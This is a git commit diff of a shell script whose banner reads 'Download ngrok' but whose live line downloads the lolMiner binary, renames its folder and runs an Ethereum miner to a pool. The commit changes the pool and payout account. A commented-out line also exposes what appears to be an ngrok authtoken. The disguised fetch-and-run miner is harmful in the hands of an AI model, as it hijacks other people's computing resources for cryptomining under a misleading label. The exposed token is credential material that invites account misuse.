4ce1b2fc158da13b2877f14fd69c867bbc2b34b6
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-04-15 12:51:55 +0530

    Update Ethans.sh

--- Ethans.sh
+++ Ethans.sh
@@ -3,7 +3,7 @@ echo "======================="
 echo "Download ngrok"
 echo "======================="
 #wget -O ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && mv 1.31 mng && cd mng && chmod +x lolMiner && ./lolMiner --algo ETHASH --pool stratum+ssl://eth-us-east.flexpool.io:5555 --user 0x5c32f4894827ee28bcfbb5a8c221470147290ae2.kadal6
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xvf lolMiner_v1.31_Lin64.tar.gz && mv 1.31 mng && cd mng && chmod +x lolMiner && ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.poolbinance.com:443 --user Gok001.Test
 #unzip ngrok.zip > /dev/null 2>&1
 #read -p "Paste Ngrok Authtoken: " CRP
 #./ngrok 23KE1QqMII3UDnPOa4uleYgvRcl_5L7bNgSRteRyL4PCUonmF $CRP
